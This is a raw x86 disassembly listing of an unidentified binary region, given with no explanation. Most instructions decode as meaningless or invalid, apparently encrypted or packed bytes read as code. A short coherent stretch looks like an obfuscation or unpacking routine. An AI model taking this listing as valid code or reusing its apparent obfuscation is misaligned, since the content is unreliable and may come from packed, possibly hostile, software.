  41aed0:	imul   ecx,DWORD PTR [edi+eax*8],0xffffff91
  41aed4:	retf   
  41aed5:	je     0x41af2e
  41aed7:	shr    DWORD PTR [edx],1
  41aed9:	jle    0x41aee8
  41aedb:	fcomi  st,st(3)
  41aedd:	adc    BYTE PTR [edx-0x7db436fa],ah
  41aee3:	fwait
  41aee4:	je     0x41af15
  41aee6:	push   es
  41aee7:	cmp    BYTE PTR gs:[esi],dh
  41aeea:	sub    al,0xdb
  41aeec:	mov    ebx,0x1a40e90e
  41aef1:	mov    edi,0xf05429e3
  41aef6:	scas   al,BYTE PTR es:[edi]
  41aef7:	mov    ebp,0xf76a851e
  41aefc:	cwde   
  41aefd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aefe:	cwde   
  41aeff:	pop    es
  41af00:	mov    edx,0x4880f733
  41af05:	cmp    al,0x90
  41af07:	jne    0x41af4a
  41af09:	(bad)  
  41af0a:	jmp    0x788a:0xdc9a27a9
  41af11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af12:	cmp    BYTE PTR [esi],al
  41af14:	fcomip st,st(6)
  41af16:	retf   0x2f2a
  41af19:	jge    0x41af70
  41af1b:	cmp    al,0x8d
  41af1d:	ror    BYTE PTR [esi],cl
  41af1f:	dec    edi
  41af20:	nop
  41af21:	mov    al,0xad
  41af23:	or     DWORD PTR [ebx-0x77],0x36
  41af27:	cmp    ecx,DWORD PTR [esi*8-0x691d9f5c]
  41af2e:	pusha  
  41af2f:	out    dx,eax
  41af30:	shl    BYTE PTR ds:0xfe9ebe9e,1
  41af36:	mov    ?,eax
  41af38:	add    edx,DWORD PTR [edi]
  41af3a:	lods   al,BYTE PTR ds:[esi]
  41af3b:	push   eax
  41af3c:	sahf   
  41af3d:	mov    ecx,0x83119340
  41af42:	jecxz  0x41aed6
  41af44:	rol    BYTE PTR [eax-0x61],cl
  41af47:	inc    edi
  41af48:	dec    ebp
  41af49:	es scas al,BYTE PTR es:[edi]
  41af4b:	je     0x41aef2
  41af4d:	dec    eax
  41af4e:	pop    eax
  41af4f:	push   edi
  41af50:	fidiv  DWORD PTR [ebx]
  41af52:	pop    ebp
  41af53:	adc    ch,BYTE PTR [eax]
  41af55:	popa   
  41af56:	scas   al,BYTE PTR es:[edi]
  41af57:	xor    edx,DWORD PTR [esi-0xc]
  41af5a:	in     al,0xd5
  41af5c:	addr16 or al,cl
  41af5f:	adc    dl,BYTE PTR [ebx+0x77b04e31]
  41af65:	(bad)  
  41af66:	push   ebx
  41af67:	pop    ss
  41af68:	cmp    al,0x1b
  41af6a:	popf   
  41af6b:	mov    WORD PTR [ecx+eiz*1],?
  41af6e:	adc    ebx,DWORD PTR [esi-0x4e5e9a5a]
  41af74:	adc    al,0x78
  41af76:	xor    ah,BYTE PTR [ecx]
  41af78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af79:	dec    edi
  41af7b:	adc    esp,DWORD PTR [esi-0x14]
  41af7e:	pushf  
  41af7f:	bound  esp,QWORD PTR es:[bx+si+0x10]
  41af84:	je     0x41af75
  41af86:	jbe    0x41afe5
  41af88:	daa    
  41af89:	sub    DWORD PTR [edi-0x71],ebp
  41af8c:	lods   eax,DWORD PTR ds:[esi]
  41af8d:	mov    esp,0x3cdc8d94
  41af92:	push   edi
  41af93:	outs   dx,DWORD PTR ds:[esi]
  41af94:	and    DWORD PTR [edx],ecx
  41af96:	gs sti 
  41af98:	das    
  41af99:	mov    ebp,0x3744352
  41af9e:	retf   
  41af9f:	mov    esp,0xa70c7a70
  41afa4:	pop    edi
  41afa5:	sub    DWORD PTR [edi],ebx
  41afa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afa8:	pusha  
  41afa9:	jnp    0x41af95
  41afab:	mov    ch,0x48
  41afad:	aam    0xa7
  41afaf:	jecxz  0x41afda
  41afb1:	leave  
  41afb2:	es and al,0xdc
  41afb5:	cmp    al,0xe0
  41afb7:	ret    0xfef8
  41afba:	sbb    BYTE PTR [edx],cl
  41afbc:	(bad)  
  41afbd:	aad    0x5d
  41afbf:	lock sbb eax,0x51c9673d
  41afc5:	sbb    al,BYTE PTR [esi+esi*2]
  41afc8:	jnp    0x41af71
  41afca:	xor    DWORD PTR [edx],ebx
  41afcc:	aas    
  41afcd:	in     eax,dx
  41afce:	xchg   ebx,eax
  41afcf:	jbe    0x41af9e
  41afd1:	lahf   
  41afd2:	jno    0x41aff3
  41afd4:	jmp    0x41afac
  41afd6:	or     esp,DWORD PTR [edi+eiz*8-0x6b7d60a2]
  41afdd:	imul   ebp,DWORD PTR [eax-0x46],0xffffffeb
  41afe1:	mov    eax,ds:0x1cfb89a1
  41afe6:	dec    ecx
  41afe7:	fild   DWORD PTR [eax+0x2b891573]
  41afed:	adc    edi,DWORD PTR [edi+0x5507d88c]
  41aff3:	push   ds
  41aff4:	mov    edi,0xe93dea0c
  41aff9:	add    BYTE PTR [ebx-0x7d],bh
  41affc:	jg     0x41afe4
  41affe:	xor    dh,BYTE PTR [edx]
  41b000:	cmp    esp,ebx
  41b002:	or     eax,0x3ccabc64
  41b007:	xchg   ecx,eax
  41b008:	aad    0x9b
  41b00a:	test   eax,0x7f711807
  41b00f:	mov    ch,0x8
  41b011:	scas   eax,DWORD PTR es:[edi]
  41b012:	xor    al,0xb2
  41b014:	and    bh,dl
  41b016:	enter  0x7128,0x42
  41b01a:	jge    0x41b043
  41b01c:	xor    esi,DWORD PTR [eax-0x456f5e6a]
  41b022:	mov    bh,0x83
  41b024:	stos   DWORD PTR es:[edi],eax
  41b025:	push   ebx
  41b026:	inc    edi
  41b027:	jb     0x41afe5
  41b029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b02a:	mov    BYTE PTR [edi],dh
  41b02c:	int3   
  41b02d:	shr    edi,0x3e
  41b030:	inc    esi
  41b031:	jo     0x41b007
  41b033:	pop    ss
  41b034:	retf   
  41b035:	pop    ds
  41b036:	jns    0x41b043
  41b038:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b039:	out    dx,eax
  41b03a:	mov    esp,0x75a087bc
  41b03f:	inc    eax
  41b040:	data16 jo 0x41b036
  41b043:	and    eax,0xf5acbd83
  41b048:	je     0x41afdd
  41b04a:	adc    esp,DWORD PTR [ebx-0x2b5264dd]
  41b050:	jnp    0x41afd9
  41b052:	loope  0x41b006
  41b054:	leave  
  41b055:	jmp    0xf5a0a07f
  41b05a:	sti    
  41b05b:	rol    ebp,1
  41b05d:	sbb    dh,BYTE PTR [ecx+edi*2+0x2da5601f]
  41b064:	or     eax,0x2b2ba2aa
  41b069:	mov    bl,0x7c
  41b06b:	sti    
  41b06c:	xchg   esp,eax
  41b06d:	inc    ecx
  41b06e:	sbb    DWORD PTR [edi],ebx
  41b070:	stos   DWORD PTR es:[edi],eax
  41b071:	adc    bh,BYTE PTR [edx-0x2b4f0905]
  41b077:	inc    edx
  41b078:	pop    esi
  41b079:	xlat   BYTE PTR ds:[ebx]
  41b07a:	mov    DWORD PTR [edi+ebp*1-0x431ee7f2],eax
  41b081:	leave  
  41b082:	shr    edx,0x89
  41b085:	outs   dx,DWORD PTR ds:[esi]
  41b086:	aaa    
  41b087:	mov    gs,WORD PTR [esi-0x2be699d9]
  41b08d:	out    dx,eax
  41b08e:	adc    al,0xe0
  41b090:	mov    bh,0x58
  41b092:	jg     0x41b0dc
  41b094:	inc    ecx
  41b095:	sbb    eax,0xf5979757
  41b09a:	and    al,0xd5
  41b09c:	arpl   WORD PTR [eax],dx
  41b09e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b09f:	je     0x41b0ab
  41b0a1:	fld    DWORD PTR [eax+0x32]
  41b0a4:	popa   
  41b0a5:	and    al,0xe3
  41b0a7:	mov    ds:0xf2b9450e,eax
  41b0ac:	add    DWORD PTR [esi-0x2fd16328],0xffffffca
  41b0b3:	push   edi
  41b0b4:	fwait
  41b0b5:	mov    es,WORD PTR ds:0x3c6ad1c9
  41b0bb:	enter  0x61f1,0x58
  41b0bf:	xor    DWORD PTR [ebx-0x49ffab8e],esp
  41b0c5:	icebp  
  41b0c6:	leave  
  41b0c7:	inc    esp
  41b0c8:	mov    ebx,0x7b305c12
  41b0cd:	mov    ch,0xc9
  41b0cf:	cmp    BYTE PTR [ebx],ah
  41b0d1:	sub    BYTE PTR [ecx],ah
  41b0d3:	mov    edx,0x48771af4
  41b0d8:	fdiv   QWORD PTR [ecx+0x27]
  41b0db:	add    al,0x6f
  41b0dd:	jno    0x41b0f8
  41b0df:	bound  edi,QWORD PTR fs:[esi-0x7b]
  41b0e3:	into   
  41b0e4:	xor    al,0x1a
  41b0e6:	inc    esp
  41b0e7:	inc    edx
  41b0e8:	aas    
  41b0e9:	fadd   DWORD PTR [edx-0x3af858a9]
  41b0ef:	dec    ecx
  41b0f0:	test   al,0x7f
  41b0f2:	fwait
  41b0f3:	out    dx,al
  41b0f4:	sbb    DWORD PTR [ecx],ebp
  41b0f6:	mov    eax,0x7dbe7ab3
  41b0fb:	(bad)
  41b0fe:	mov    esi,0xfff2f106
  41b103:	inc    edi
  41b105:	sub    BYTE PTR [edi],0x57
  41b108:	add    eax,0x93686901
  41b10d:	sahf   
  41b10e:	jnp    0x41b0a5
  41b110:	push   edi
  41b111:	ja     0x41b110
  41b113:	outs   dx,DWORD PTR ds:[esi]
  41b114:	js     0x41b15b
  41b116:	inc    ebx
  41b117:	or     DWORD PTR [edi-0x69],esp
  41b11a:	clc    
  41b11b:	push   cs
  41b11c:	jo     0x41b0c3
  41b11e:	dec    esi
  41b11f:	jecxz  0x41b0d6
  41b121:	in     al,dx
  41b122:	adc    DWORD PTR [esi-0x5c],ebx
  41b125:	or     al,0x73
  41b127:	adc    ch,BYTE PTR [edi+0x0]
  41b12a:	pusha  
  41b12b:	neg    DWORD PTR [eax+0x339a2c3b]
  41b131:	sub    al,0x4c
  41b133:	push   cs
  41b134:	mov    ebp,0x3439190
  41b139:	jecxz  0x41b0d6
  41b13b:	pushf  
  41b13c:	popa   
  41b13d:	test   DWORD PTR [esi+0x76],0x155e7059
  41b144:	xor    BYTE PTR [ecx-0x1e],bh
  41b147:	jno    0x41b173
  41b149:	sahf   
  41b14a:	ret    0x9144
  41b14d:	(bad)  [ebp-0x282418e7]
  41b153:	ins    DWORD PTR es:[di],dx
  41b155:	in     al,dx
  41b156:	jo     0x41b0e0
  41b158:	imul   ebp,DWORD PTR [edx+esi*4-0x685469db],0xffffffee
  41b160:	dec    ebx
  41b161:	mov    ds,WORD PTR [ecx-0x6c]
  41b164:	sub    al,0xcc
  41b166:	push   es
  41b167:	jl     0x41b1bd
  41b169:	or     BYTE PTR cs:[eax+0x2c3dd5c3],ah
  41b170:	shr    DWORD PTR [edi],1
  41b172:	cdq    
  41b173:	rcl    BYTE PTR [edx-0x6c],cl
  41b176:	test   bl,dl
  41b178:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b179:	adc    DWORD PTR [edx-0x4e80dcfd],ecx
  41b17f:	xchg   ebp,eax
  41b180:	js     0x41b1c4
  41b182:	or     DWORD PTR [ecx+0xc],0x2e
  41b186:	lea    edx,[eax]
  41b188:	sub    BYTE PTR [ebp+0x5a8e166e],dh
  41b18e:	fxch   st(1)
  41b190:	int3   
  41b191:	or     edx,DWORD PTR [ebx+ebx*8-0x1]
  41b195:	repnz mov eax,0x1e5b1924
  41b19b:	enter  0xfb8b,0xe0
  41b19f:	cmp    BYTE PTR [eax-0x24c75583],ah
  41b1a5:	enter  0xfb9a,0xf4
  41b1a9:	lock add dl,ch
  41b1ac:	mov    al,ds:0x7dba0055
  41b1b1:	mov    ebp,0x36e4d4fa
  41b1b6:	jle    0x41b232
  41b1b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1b9:	fwait
  41b1ba:	stos   DWORD PTR es:[edi],eax
  41b1bb:	mov    edi,0xdc7377a4
  41b1c0:	lahf   
  41b1c1:	pop    ebp
  41b1c2:	mov    es,WORD PTR [esi]
  41b1c4:	pop    esp
  41b1c5:	push   ecx
  41b1c6:	jl     0x41b15e
  41b1c8:	dec    edx
  41b1c9:	(bad)  
  41b1ca:	fadd   QWORD PTR [edx]
  41b1cc:	xchg   ebp,eax
  41b1cd:	pop    ecx
  41b1ce:	ror    DWORD PTR ds:0x445f29f,1
  41b1d4:	cli    
  41b1d5:	pop    edi
  41b1d6:	jp     0x41b22f
  41b1d8:	(bad)  
  41b1d9:	cmc    
  41b1da:	idiv   eax
  41b1dc:	enter  0xfabb,0xa8
  41b1e0:	xor    cl,bl
  41b1e2:	jg     0x41b21c
  41b1e4:	pop    edx
  41b1e5:	repnz pusha 
  41b1e7:	push   ebx
  41b1e8:	jmp    0xc6ba:0xf733bf90
  41b1ef:	push   di
  41b1f1:	rcl    BYTE PTR [eax],1
  41b1f3:	fadd   st,st(1)
  41b1f5:	push   esi
  41b1f6:	test   BYTE PTR [edi+0x4a],ch
  41b1f9:	dec    edx
  41b1fa:	xchg   DWORD PTR [esi+0x64d15490],esp
  41b200:	jl     0x41b1c8
  41b202:	push   ebp
  41b203:	scas   al,BYTE PTR es:[edi]
  41b204:	push   0x41
  41b206:	add    DWORD PTR [ecx-0x34],0x61f39db1
  41b20d:	adc    dh,BYTE PTR [eax+edx*8]
  41b210:	push   ds
  41b211:	shr    edi,1
  41b213:	sub    esi,edi
  41b215:	xor    ecx,0xa82a1654
  41b21b:	pop    esp
  41b21c:	sbb    al,0x93
  41b21e:	mov    ch,0xf3
  41b220:	es xchg esi,ebp
  41b223:	or     eax,0xd4d4c558
  41b228:	mov    eax,0xaaac379c
  41b22d:	into   
  41b22e:	sbb    eax,0x7396b9d7
  41b233:	sub    al,0x8b
  41b235:	or     DWORD PTR [ecx-0x75],esp
  41b238:	xor    al,0x4c
  41b23a:	inc    edi
  41b23b:	(bad)  
  41b23c:	and    ebx,esp
  41b23e:	call   0xfc920ae5
  41b243:	in     eax,dx
  41b244:	xor    al,0xae
  41b246:	sbb    eax,0x4dc4ff7a
  41b24b:	add    DWORD PTR [ecx+0x5543999e],ebx
  41b251:	xchg   ebp,eax
  41b252:	mov    eax,ds:0x3fca8f6c
  41b257:	inc    ecx
  41b258:	xchg   edx,eax
  41b259:	mov    eax,0x45d93f81
  41b25e:	sahf   
  41b25f:	stc    
  41b260:	pop    ecx
  41b261:	xor    esi,DWORD PTR fs:[eax]
  41b264:	clc    
  41b265:	rol    ebx,cl
  41b267:	or     BYTE PTR gs:[ebp-0x5d],dl
  41b26b:	into   
  41b26c:	or     esp,DWORD PTR [eax-0x26867a98]
  41b272:	push   ebx
  41b273:	pop    edi
  41b274:	scas   al,BYTE PTR es:[edi]
  41b275:	and    BYTE PTR ss:[ebp-0x7db89fea],0xd8
  41b27d:	mov    edx,0xecb0d4b6
  41b282:	cmp    cl,cl
  41b284:	inc    edx
  41b285:	and    eax,0x6b73f7a3
  41b28a:	pop    eax
  41b28b:	jnp    0x41b300
  41b28d:	pusha  
  41b28e:	xor    BYTE PTR [ebp+0x7c],bh
  41b291:	mov    eax,ds:0xf9de3cdc
  41b296:	aad    0x4e
  41b298:	add    DWORD PTR [esi+ebp*2],edx
  41b29b:	adc    BYTE PTR [ebx-0x8],bl
  41b29e:	sbb    eax,0x582fd475
  41b2a3:	push   esp
  41b2a4:	sbb    bl,BYTE PTR [esi-0x47f4640]
  41b2aa:	push   edx
  41b2ac:	xlat   BYTE PTR ds:[ebx]
  41b2ad:	(bad)  
  41b2ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2af:	gs repz test al,ah
  41b2b3:	mov    eax,0x81f458dc
  41b2b8:	test   DWORD PTR [ebx-0x76adfc71],ecx
  41b2be:	lahf   
  41b2bf:	push   ecx
  41b2c0:	mov    gs,ecx
  41b2c2:	fiadd  DWORD PTR [ebp-0x4e7b9d0e]
  41b2c8:	(bad)  
  41b2c9:	sbb    DWORD PTR [edx+0x25],edi
  41b2cc:	repnz fs leave 
  41b2cf:	pop    eax
  41b2d0:	and    ah,bl
  41b2d2:	mov    ds:0x5d5ea206,eax
  41b2d7:	popa   
  41b2d8:	lahf   
  41b2d9:	(bad)  
  41b2da:	sbb    BYTE PTR [ebp+0x28],dl
  41b2dd:	jb     0x41b30f
  41b2df:	push   cs
  41b2e0:	scas   eax,DWORD PTR es:[edi]
  41b2e1:	test   DWORD PTR ds:0x4446b4f3,ecx
  41b2e7:	loope  0x41b318
  41b2e9:	push   eax
  41b2ea:	loop   0x41b280
  41b2ec:	or     eax,esp
  41b2ee:	xchg   ebx,eax
  41b2ef:	cmp    BYTE PTR [eax],bl
  41b2f1:	test   al,0xc2
  41b2f3:	pop    ds
  41b2f4:	mov    ds:0x8faca19f,al
  41b2f9:	jo     0x41b338
  41b2fb:	push   0x69b8342a
  41b300:	mov    cl,0x39
  41b302:	clc    
  41b303:	jmp    0x41b29d
  41b305:	sub    dl,ch
  41b307:	jmp    0x41b2dd
  41b309:	mov    DWORD PTR [edx-0x20],eax
  41b30c:	or     bl,bh
  41b30e:	ja     0x41b324
  41b310:	cmp    ch,BYTE PTR [ebx+0x33]
  41b313:	cli    
  41b314:	xchg   ebp,eax
  41b315:	out    dx,al
  41b316:	fdiv   DWORD PTR [ebp+0x51]
  41b319:	cdq    
  41b31a:	std    
  41b31b:	adc    al,0x96
  41b31d:	popf   
  41b31e:	pop    ebp
  41b31f:	cdq    
  41b320:	xor    al,0xf9
  41b322:	jb     0x41b2e7
  41b324:	jl     0x41b359
  41b326:	push   eax
  41b327:	pop    ss
  41b328:	int    0x7b
  41b32a:	sbb    al,0xbc
  41b32c:	dec    esp
  41b32d:	fst    st(6)
  41b32f:	ds stos BYTE PTR es:[edi],al
  41b331:	xor    DWORD PTR [ebx+0x32],0x3d
  41b335:	popa   
  41b336:	mov    DWORD PTR [ebp+0x47b95cc1],0x7c549e34
  41b340:	xchg   esp,eax
  41b341:	dec    ecx
  41b342:	std    
  41b343:	mov    ebp,0xe3c0097c
  41b348:	sbb    al,0x20
  41b34a:	cdq    
  41b34b:	sahf   
  41b34c:	inc    esp
  41b34d:	xor    al,0x18
  41b34f:	adc    al,0x46
  41b351:	push   ebx
  41b352:	shl    ecx,1
  41b354:	mov    ebp,esi
  41b356:	ret    0x3304
  41b359:	int3   
  41b35a:	add    BYTE PTR [ebx+0x484f37af],bh
  41b360:	inc    eax
  41b361:	enter  0xc19f,0xc9
  41b365:	(bad)  
  41b366:	cmp    esi,DWORD PTR [eax]
  41b368:	xchg   BYTE PTR [ebp+0x42ab471d],cl
  41b36e:	push   ebx
  41b36f:	test   al,0x42
  41b371:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b372:	fimul  WORD PTR [edx-0x7aa2e58c]
  41b378:	addr16 dec ecx
  41b37a:	mov    al,0x8c
  41b37c:	mov    ds:0x9fae3676,al
  41b381:	es das 
  41b383:	mov    bh,0x71
  41b385:	ret    0x9a5f
  41b388:	add    DWORD PTR [edx-0x5fb2d7ed],esi
  41b38e:	inc    edi
  41b38f:	and    bl,ah
  41b391:	int    0xcf
  41b393:	sub    al,0xf7
  41b395:	cmp    bl,BYTE PTR [ebx+edi*8-0x6c6e7c3f]
  41b39c:	cs es xchg ebx,eax
  41b39f:	(bad)  
  41b3a1:	(bad)  
  41b3a2:	sbb    DWORD PTR [edx-0x72],edx
  41b3a5:	sub    al,0xb
  41b3a7:	mov    eax,ds:0xec3f070
  41b3ac:	les    eax,FWORD PTR [eax]
  41b3ae:	loope  0x41b35c
  41b3b0:	outs   dx,BYTE PTR ds:[esi]
  41b3b1:	clc    
  41b3b2:	out    dx,eax
  41b3b3:	mov    DWORD PTR [edi-0x8cbbb89],ebx
  41b3b9:	inc    esi
  41b3ba:	lds    edi,FWORD PTR [ebx-0x6b]
  41b3bd:	inc    esi
  41b3be:	lahf   
  41b3bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3c0:	mov    DWORD PTR [ebp+0x753400c4],0xfbf54731
  41b3ca:	in     eax,0xf0
  41b3cc:	pop    esi
  41b3cd:	scas   eax,DWORD PTR es:[edi]
  41b3ce:	fdivr  DWORD PTR [esi+0x570f5d6e]
  41b3d4:	rcl    esi,1
  41b3d6:	in     eax,dx
  41b3d7:	stc    
  41b3d8:	test   DWORD PTR [edx+0x53],esi
  41b3db:	dec    ecx
  41b3dc:	mov    bl,0x4a
  41b3de:	pop    ecx
  41b3df:	jmp    0x9ea2:0x8e84cb17
  41b3e6:	inc    ebp
  41b3e7:	adc    DWORD PTR [ebx+edi*2+0x4d],edi
  41b3eb:	(bad)  
  41b3ec:	sbb    DWORD PTR [esi+ebx*8],edx
  41b3ef:	adc    BYTE PTR [edx-0xd],ah
  41b3f2:	into   
  41b3f3:	adc    al,BYTE PTR [edx]
  41b3f5:	test   DWORD PTR [edi+edi*4],edx
  41b3f8:	ret    0x6354
  41b3fb:	push   edx
  41b3fc:	rol    edx,cl
  41b3fe:	sbb    al,0x5e
  41b400:	invd   
  41b402:	pop    es
  41b403:	push   edx
  41b404:	mov    dh,0x1a
  41b406:	dec    ecx
  41b407:	or     eax,0x1df7b184
  41b40c:	out    dx,al
  41b40d:	mov    ah,0x1d
  41b40f:	and    BYTE PTR [ecx-0x79],ah
  41b412:	ja     0x41b406
  41b414:	add    al,BYTE PTR ds:[eax]
  41b417:	pop    ds
  41b418:	jb     0x41b441
  41b41a:	(bad)  
  41b41c:	repnz cmc 
  41b41e:	cmp    DWORD PTR [eax],0x51fcbeb0
  41b424:	sahf   
  41b425:	xchg   DWORD PTR [ecx+ecx*1+0x5f],eax
  41b429:	shl    BYTE PTR [ebx+0x2d7e6bf3],1
  41b42f:	mov    ebp,0x6b89bf92
  41b434:	pop    es
  41b435:	jg     0x41b4ae
  41b437:	mov    dx,WORD PTR [ebp+0x8]
  41b43b:	mov    ebx,DWORD PTR [ebp-0x58]
  41b43e:	add    edx,0x5708fa
  41b444:	imul   edx,ebx
  41b447:	mov    DWORD PTR [ebp-0x58],edx
  41b44a:	mov    edx,DWORD PTR [ebp+0x8]
  41b44d:	mov    ebx,DWORD PTR [ebp-0x54]
  41b450:	add    edx,0x64f898
  41b456:	or     edx,ebx
  41b458:	mov    DWORD PTR [ebp-0x54],edx
  41b45b:	mov    edx,DWORD PTR [ebp+0x8]
  41b45e:	mov    ebx,DWORD PTR [ebp-0x50]
  41b461:	add    edx,ecx
  41b463:	xor    edx,ebx
  41b465:	mov    DWORD PTR [ebp-0x50],edx
  41b468:	mov    edx,DWORD PTR [ebp+0x8]
  41b46b:	mov    ebx,DWORD PTR [ebp-0x4c]
  41b46e:	add    edx,edi
  41b470:	and    edx,ebx
  41b472:	mov    DWORD PTR [ebp-0x4c],edx
  41b475:	mov    edx,DWORD PTR [ebp+0x8]
  41b478:	mov    ebx,DWORD PTR [ebp-0x48]
  41b47b:	lea    edx,[ebx+edx*1+0x241fcdf]
  41b482:	mov    DWORD PTR [ebp-0x48],edx
  41b485:	mov    edx,DWORD PTR [ebp+0x8]
  41b488:	mov    ebx,0xfa5e1524
  41b48d:	sub    ebx,edx
  41b48f:	add    ebx,DWORD PTR [ebp-0x44]
  41b492:	mov    DWORD PTR [ebp-0x44],ebx
  41b495:	mov    edx,DWORD PTR [ebp+0x8]
  41b498:	xor    edx,eax
  41b49a:	add    edx,esi
  41b49c:	jne    0x4190c6
  41b4a2:	mov    edx,DWORD PTR [ebp-0x8]
  41b4a5:	mov    ebx,DWORD PTR [ebp-0xc]
  41b4a8:	xor    edx,eax
  41b4aa:	lea    edx,[edx+ebx*1+0x3272f1]
  41b4b1:	mov    DWORD PTR [ebp-0xc],edx
  41b4b4:	mov    edx,DWORD PTR [ebp-0x10]
  41b4b7:	xor    edx,eax
  41b4b9:	add    edx,esi
  41b4bb:	jne    0x41465c
  41b4c1:	jmp    0x421ff5
  41b4c6:	mov    ecx,DWORD PTR [ebp-0x14]
  41b4c9:	mov    DWORD PTR [ebp+0x8],ecx
  41b4cc:	jmp    0x41fc03
  41b4d1:	mov    ecx,DWORD PTR [ebp+0x8]
  41b4d4:	mov    edx,DWORD PTR [ebp-0x8]
  41b4d7:	xor    ecx,eax
  41b4d9:	xor    edx,eax
  41b4db:	sub    ecx,edx
  41b4dd:	sub    ecx,esi
  41b4df:	xor    ecx,eax
  41b4e1:	mov    DWORD PTR [ebp+0x8],ecx
  41b4e4:	mov    ecx,DWORD PTR [ebp+0x8]
  41b4e7:	mov    edx,DWORD PTR [ebp-0x58]
  41b4ea:	add    ecx,0x5708fa
  41b4f0:	imul   ecx,edx
  41b4f3:	jmp    0x41d852
  41b4f8:	test   al,0x3a
  41b4fa:	jl     0x41b49e
  41b4fc:	out    dx,al
  41b4fd:	mov    ds:0xdb3d32a2,al
  41b502:	sti    
  41b503:	loopne 0x41b4fd
  41b505:	outs   dx,BYTE PTR ds:[esi]
  41b506:	mov    esi,0x7cf8ed2e
  41b50b:	cmp    DWORD PTR ds:0xe83835e,0xffffffcb
  41b512:	xor    al,0xe7
  41b514:	push   ecx
  41b515:	stos   DWORD PTR es:[edi],eax
  41b516:	test   edi,0x3c513309
  41b51c:	popa   
  41b51d:	mov    ebp,0x5deb399
  41b522:	in     al,0x35
  41b524:	pop    ecx
  41b525:	cdq    
  41b526:	stos   DWORD PTR es:[edi],eax
  41b527:	out    0x35,al
  41b529:	mov    ?,WORD PTR ds:0xe2afa037
  41b52f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b530:	pop    esp
  41b531:	(bad)  
  41b532:	out    dx,al
  41b533:	scas   eax,DWORD PTR es:[edi]
  41b534:	sub    BYTE PTR [ecx+0x34],0x37
  41b538:	pop    edi
  41b539:	aam    0x9b
  41b53b:	stc    
  41b53c:	mov    ds:0x450418c5,al
  41b541:	retf   
  41b542:	aas    
  41b543:	xchg   DWORD PTR [ecx],ecx
  41b545:	(bad)  
  41b546:	out    dx,eax
  41b547:	pop    eax
  41b548:	loop   0x41b5a2
  41b54a:	xchg   BYTE PTR [edi-0x139a595d],bl
  41b550:	pop    eax
  41b551:	pop    eax
  41b552:	mov    bl,0x58
  41b554:	jg     0x41b5ab
  41b556:	xor    DWORD PTR [ebp-0x33ba690b],0x15
  41b55d:	rcl    DWORD PTR [edi],1
  41b55f:	mov    ds:0xde394138,eax
  41b564:	rcl    ebp,1
  41b566:	xor    ecx,DWORD PTR [ebx]
  41b568:	xchg   edi,eax
  41b569:	dec    ecx
  41b56a:	push   0x28
  41b56c:	int    0xcc
  41b56e:	imul   ebx,DWORD PTR [ebp+0x9],0xffffffec
  41b572:	jecxz  0x41b514
  41b574:	or     DWORD PTR [edi-0x17],edi
  41b577:	cmp    BYTE PTR [eax],bl
  41b579:	push   cs
  41b57a:	mov    ds:0x4a8ed15f,al
  41b57f:	imul   eax,edx,0x4c
  41b582:	mov    dh,0x11
  41b584:	sbb    DWORD PTR ds:[eax],ecx
  41b587:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b588:	repnz hlt 
  41b58a:	push   es
  41b58b:	jge    0x41b54f
  41b58d:	scas   al,BYTE PTR es:[edi]
  41b58e:	(bad)  
  41b58f:	cmp    eax,0xaf0d9b48
  41b594:	cmp    BYTE PTR [eax+0x646e10c5],ah
  41b59a:	pusha  
  41b59b:	push   es
  41b59c:	stos   BYTE PTR es:[edi],al
  41b59d:	dec    ebx
  41b59f:	stos   BYTE PTR es:[edi],al
  41b5a0:	mov    bl,0x85
  41b5a2:	jne    0x41b56e
  41b5a4:	mov    cl,0x92
  41b5a6:	data16 dec BYTE PTR [ebp+0x5c]
  41b5aa:	adc    al,dl
  41b5ac:	add    DWORD PTR [edx],esi
  41b5ae:	repnz and eax,DWORD PTR [edi]
  41b5b1:	in     al,0x1a
  41b5b3:	jns    0x41b543
  41b5b5:	pop    es
  41b5b6:	das    
  41b5b7:	(bad)  [esi+0x5e]
  41b5ba:	sub    eax,0x8a083a28
  41b5bf:	xor    al,0x3c
  41b5c1:	in     eax,0xca
  41b5c3:	std    
  41b5c4:	mov    ds:0x17d3db0a,eax
  41b5c9:	dec    esp
  41b5ca:	punpckhdq mm1,QWORD PTR [eax+edi*1]
  41b5ce:	mov    bh,0x30
  41b5d0:	xlat   BYTE PTR ds:[ebx]
  41b5d1:	pop    esp
  41b5d2:	push   0x6f5af315
  41b5d7:	pushf  
  41b5d8:	aad    0xde
  41b5da:	call   0x7e8781b9
  41b5df:	rcr    DWORD PTR [edx+0x10],0x75
  41b5e3:	mov    ds:0xc6fb8315,eax
  41b5e8:	int    0xc6
  41b5ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5eb:	or     eax,0x5b1b9b12
  41b5f0:	jns    0x41b597
  41b5f2:	push   edi
  41b5f3:	retf   0xc5d
  41b5f6:	mov    WORD PTR [ebx+0x3675da4e],es
  41b5fc:	dec    ebp
  41b5fd:	jno    0x41b5dd
  41b5ff:	push   edx
  41b600:	mov    al,BYTE PTR [edi]
  41b602:	xchg   DWORD PTR [ecx-0xcb8e016],ebp
  41b608:	outs   dx,BYTE PTR ds:[esi]
  41b609:	mov    al,0x70
  41b60b:	xor    al,0x6f
  41b60d:	outs   dx,BYTE PTR ds:[esi]
  41b60e:	fidivr DWORD PTR ds:0xb3b25763
  41b614:	and    BYTE PTR [esi-0x44d55010],dl
  41b61a:	aam    0x7d
  41b61c:	push   edi
  41b61d:	inc    ebx
  41b61e:	loopne 0x41b666
  41b620:	xor    al,0x46
  41b622:	rcl    BYTE PTR [eax+0x1107985c],1
  41b628:	xor    eax,0x43c312
  41b62d:	test   edx,ebp
  41b62f:	sbb    al,0xf7
  41b631:	inc    esi
